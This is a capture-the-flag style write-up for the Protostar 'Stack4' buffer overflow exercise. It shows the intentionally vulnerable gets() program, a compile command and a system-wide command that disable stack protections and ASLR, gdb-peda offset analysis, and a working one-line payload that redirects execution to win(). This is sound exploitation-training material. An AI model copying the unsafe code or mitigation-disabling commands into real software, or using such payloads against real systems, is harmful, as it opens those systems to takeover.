## Protostar-Stack4 Solution

### 1. Introduction

This is a poc solution for the "Stack4" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.
Note: I switched to ubuntu 14.04 from 20.04 from this chapter...

Source:
[https://web.archive.org/web/20170417130121/https://exploit-exercises.com/protostar/stack4/](https://web.archive.org/web/20170417130121/https://exploit-exercises.com/protostar/stack4/) 
 
**Hints:**
* Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
* A variety of introductory papers into buffer overflows may help.
* gdb lets you do “run < input”
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 4 4.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.
3. Checking target function (win).

```nasm
$ gdb -q 4
Reading symbols from 4...done.
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048461 <+0>:	push   ebp
   0x08048462 <+1>:	mov    ebp,esp
   0x08048464 <+3>:	and    esp,0xfffffff0
   0x08048467 <+6>:	sub    esp,0x50
   0x0804846a <+9>:	lea    eax,[esp+0x10]
   0x0804846e <+13>:	mov    DWORD PTR [esp],eax
   0x08048471 <+16>:	call   0x8048310 <gets@plt>
   0x08048476 <+21>:	leave  
   0x08048477 <+22>:	ret    
End of assembler dump.

gdb-peda$ print win
$1 = {void ()} 0x804844d <win>

```

The steps for checking the offset size is explained in my previous posts. 
Basically when a function is called, the current state should be pushed into stack and when the called function ends they are **pop**ed from stack into registers again. These steps aka. x86 calling conventions are explained a bit more detailed in notes.md file. 

Instruction pointer (eip register) holds the next address to be executed.


#### 2.2 Quick Solution
 
This one is similar to stack-3 but a bit different. Let's check the offset size by using peda that we didn't use on previous solutions.

Let's create a set of characters. Copy the generated pattern then paste it to input.

```nasm
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
Starting program: ./4 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd0e0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0xf7fbc000 --> 0x1a9da8 
ECX: 0xfbad2288 
EDX: 0xf7fbd8a4 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd130 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41344141
[------------------------------------stack-------------------------------------]
0000| 0xffffd130 ("AJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd134 ("fAA5AAKAAgAA6AAL")
0008| 0xffffd138 ("AAKAAgAA6AAL")
0012| 0xffffd13c ("AgAA6AAL")
0016| 0xffffd140 ("6AAL")
0020| 0xffffd144 --> 0xffffd100 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd148 --> 0xffffd164 --> 0xcd02bd8c 
0028| 0xffffd14c --> 0x804a018 --> 0xf7e2b9e0 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41344141 in ?? ()

```

### Let's check the offset by using peda

```x86asm
gdb-peda$ i r ebp
ebp            0x65414149	0x65414149

gdb-peda$ pattern offset 0x65414149
1698775369 found at offset: 72
```

```x86asm
gdb-peda$ print $eip
$1 = (void (*)()) 0x41344141
gdb-peda$ pattern offset 0x41344141
1093943617 found at offset: 76
```

So we need 72 bytes of junk (let's use nops - \x90). Since the base pointer also stored in the stack righ after esp we need to overwrite ebp as well to control program flow and 4 bytes for ebp as well.

Here is the summary of our attempt with the pattern:

```js
"\x90" * 72       -> Offset
"BBBB"            -> ebp
address of win()  -> eip
```

```py
gdb-peda$ r <<< $(python -c "print '\x90' * 72 + 'BBBB' + '\x4d\x84\x04\x08'")
Starting program: ./4 <<< $(python -c "print '\x90' * 72 + 'BBBB' + '\x4d\x84\x04\x08'")
code flow successfully changed
Program received signal SIGSEGV, Segmentation fault.
...trim...

gdb-peda$ i r ebp
ebp            0x42424242	0x42424242
```

#### 2.3 Final PoC

```py
python -c "print '\x90' * 76 + '\x4d\x84\x04\x08'" | ./4
```
